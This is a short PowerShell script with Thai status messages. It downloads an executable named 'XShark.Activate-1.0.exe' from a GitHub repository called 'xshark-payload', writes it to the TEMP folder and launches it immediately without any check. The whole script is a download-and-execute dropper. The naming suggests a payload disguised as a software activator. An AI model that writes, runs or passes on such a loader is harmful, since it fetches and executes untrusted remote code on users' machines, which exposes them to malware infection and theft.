$url = "https://github.com/puppup3336-lab/xshark-payload/releases/download/V1.0/XShark.Activate-1.0.exe"
$dest = "$env:TEMP\XShark.Activate-1.0.exe"

Write-Host "กำลังเรียกใช้โปรแกรม..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $dest

Write-Host "กำลังเปิดโปรแกรม..." -ForegroundColor Green
Start-Process $dest
